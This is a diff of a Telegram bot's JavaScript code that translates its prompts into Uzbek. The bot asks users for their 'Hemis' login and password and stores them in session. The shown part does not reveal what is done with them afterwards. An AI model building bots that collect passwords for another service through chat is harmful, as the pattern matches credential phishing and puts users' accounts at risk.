@@ -15,13 +15,13 @@ bot.use(session());
 // Start command to initiate login process
 bot.command('start', (ctx) => {
     ctx.session = { step: 'login', credentials: [] }; // Initialize session
-    ctx.reply('Please enter your login:');
+    ctx.reply('Iltimos Hemis login raqamingizni kiriting:');
 });
 
 // Handle user messages
 bot.on('text', (ctx) => {
     if (!ctx.session || !ctx.session.step) {
-        ctx.reply('Please type /start to begin the login process.');
+        ctx.reply('Qaytadan kirish uchun /start buyrug\'ini bering.');
         return;
     }
 
@@ -31,7 +31,7 @@ bot.on('text', (ctx) => {
         // Store login
         ctx.session.credentials[0] = userMessage;
         ctx.session.step = 'password'; // Move to next step
-        ctx.reply('Login saved. Now, enter your password:');
+        ctx.reply('Login saqlandi, Endi parolni kiriting:');
     } else if (ctx.session.step === 'password') {
         // Store password
         ctx.session.credentials[1] = userMessage;
